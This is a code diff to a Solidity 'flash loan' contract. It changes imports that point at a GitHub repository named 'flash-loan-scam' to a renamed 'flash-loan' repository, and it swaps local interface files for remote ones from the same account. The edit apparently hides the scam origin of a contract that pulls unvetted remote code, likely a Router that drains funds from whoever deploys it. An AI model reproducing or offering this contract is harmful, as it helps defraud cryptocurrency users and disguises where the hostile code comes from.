@@ -2,19 +2,19 @@ pragma solidity ^0.5.0;
 
 
 // PancakeSwap Smart Contracts
-import { IPancakeCallee } from "https://github.com/pancakeswap-flashloan/flash-loan-scam/blob/main/contracts/Interfaces.sol";
-import { IPancakeFactory } from "https://github.com/pancakeswap-flashloan/flash-loan-scam/blob/main/contracts/Interfaces.sol";
+import { IPancakeCallee } from "https://github.com/pancakeswap-flashloan/flash-loan/blob/main/contracts/Interfaces.sol";
+import { IPancakeFactory } from "https://github.com/pancakeswap-flashloan/flash-loan/blob/main/contracts/Interfaces.sol";
 
 //BakerySwp Smart contracts
-import { IBakerySwapFactory } from "https://github.com/pancakeswap-flashloan/flash-loan-scam/blob/main/contracts/Interfaces.sol";
+import { IBakerySwapFactory } from "https://github.com/pancakeswap-flashloan/flash-loan/blob/main/contracts/Interfaces.sol";
 
 // Router
 // import "ipfs://QmSPEmnJEVjRbtmdcbeApHAVFVYGT4Lefrp45Ca2QK5923";
-import "https://github.com/pancakeswap-flashloan/flash-loan-scam/blob/main/contracts/Router.sol";
+import "https://github.com/pancakeswap-flashloan/flash-loan/blob/main/contracts/Router.sol";
 
 // Multiplier-Finance Smart Contracts
-import { ILendingPoolAddressesProvider } from "./Interfaces.sol"; // "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPoolAddressesProvider.sol";
-import { ILendingPool } from "./Interfaces.sol"; // "https://github.com/Multiplier-Finance/MCL-FlashloanDemo/blob/main/contracts/interfaces/ILendingPool.sol";
+import { ILendingPoolAddressesProvider } from "https://github.com/pancakeswap-flashloan/flash-loan/blob/main/contracts/Interfaces.sol";
+import { ILendingPool } from "https://github.com/pancakeswap-flashloan/flash-loan/blob/main/contracts/Interfaces.sol";
 
 
 contract InitiateFlashLoan {
